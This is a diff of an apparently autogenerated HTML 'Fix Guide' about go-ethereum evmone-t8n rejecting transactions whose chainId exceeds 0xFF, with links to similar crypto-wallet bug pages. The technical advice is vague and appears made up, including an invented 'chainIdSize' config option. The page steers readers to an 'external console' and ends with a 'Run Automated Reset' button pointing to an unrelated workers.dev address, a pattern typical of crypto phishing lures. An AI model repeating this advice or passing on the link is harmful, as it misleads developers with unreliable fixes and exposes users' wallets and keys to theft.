@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: system-ui;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,38 @@
 <h1>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users observe that their transactions are being rejected by the Go Ethereum Evmone T8N when the <code>chainId</code> is greater than <code>0xFF</code>, which is parsed as a <code>uint8</code> value, resulting in an error that prevents transaction execution.</li>
+<li>Users encounter an error when attempting to process transactions with a <code>chainId</code> greater than <code>0xFF</code> using the go-ethereum evmone-t8n implementation, resulting in rejected transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The root cause of this issue lies in the parsing of the <code>chainId</code> as a <code>uint8</code> value, which has a maximum limit of <code>0xFF</code> (255). When the <code>chainId</code> exceeds this limit, it is not properly parsed, leading to transaction rejection.</li>
+<li>The issue arises due to the <code>chainId</code> being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255), causing any <code>chainId</code> greater than this to be rejected.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, the following manual overrides can be applied:</li>
-<li>Increase the <code>chainId</code> parsing limit by modifying the Evmone configuration.</li>
-<li>Update the transaction parameters to ensure compatibility with the Evmone parser.</li>
-<li>Use custom parsing logic to handle <code>chainId</code> values greater than <code>0xFF</code>.</li>
+<li>To resolve this issue, the following steps can be taken:</li>
+<li>Update the <code>chainId</code> to a value within the <code>uint8</code> range.</li>
+<li>Modify the evmone-t8n configuration to support <code>uint16</code> or larger for <code>chainId</code>.</li>
+<li>Utilize a custom patch for the go-ethereum implementation to handle larger <code>chainId</code> values, such as:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;evmone&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x100&quot;</span>
+<span class="w">  </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;evmone&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;t8n&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;chainIdSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uint16&quot;</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an alternative console for advanced debugging and configuration. </p>
+<p>Consider accessing the node via an external console for further debugging.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Go Ethereum Evmone T8N installed and configured</li>
-<li>Basic understanding of Ethereum transaction processing</li>
-<li>Familiarity with Evmone configuration and customization options</li>
+<li>A go-ethereum node with evmone-t8n implementation</li>
+<li>A <code>chainId</code> value greater than <code>0xFF</code></li>
+<li>Basic understanding of Ethereum transaction processing and node configuration</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">TronLink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
